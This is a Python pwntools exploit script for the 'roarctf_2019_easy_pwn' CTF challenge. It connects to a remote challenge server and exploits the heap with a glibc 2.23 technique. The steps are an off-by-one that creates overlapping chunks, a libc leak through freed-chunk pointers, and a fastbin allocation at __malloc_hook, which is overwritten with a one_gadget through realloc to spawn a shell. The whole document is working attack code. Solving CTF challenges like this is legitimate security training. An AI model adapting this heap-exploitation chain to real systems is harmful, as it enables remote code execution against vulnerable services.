from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./roarctf_2019_easy_pwn"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("./roarctf_2019_easy_pwn")
p = remote("node4.buuoj.cn", 26982)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size):
    sla("choice: ", "1")
    sla("size: ", str(size))

def edit(index, size, con):
    sla("choice: ", "2")
    sla("index: ", str(index))
    sla("size: ", str(size))
    sa("content: ", con)

def free(index):
    sla("choice: ", "3")
    sla("index: ", str(index))

def show(index):
    sla("choice: ", "4")
    sla("index: ", str(index))


# off by one

# chunk overlap
add(0x18)   # 0
add(0x10)   # 1
add(0x60)   # 2
add(0x10)   # 3
edit(0, 0x18+10, cyclic(0x18)+p8(0x91))
free(1)

# leak libc
add(0x10)   # 1
show(2)
info = rud("content: ")
info = u64(ru("\x7f").ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
malloc_hook = info-0x68
base = malloc_hook-libc.sym["__malloc_hook"]
oneshot = base+0xf1147
realloc = base+libc.sym["realloc"]
print("realloc: ", hex(realloc))

# alloc to malloc_hook
add(0x60)   # 4
free(2)
edit(4, 0x8, p64(malloc_hook-0x23))
add(0x60)   # 2
add(0x60)   # 5
edit(5, 0x23-0x8, cyclic(0x13-0x8)+p64(oneshot)+p64(realloc+0x4))

# attack
add(0x10)

p.interactive()


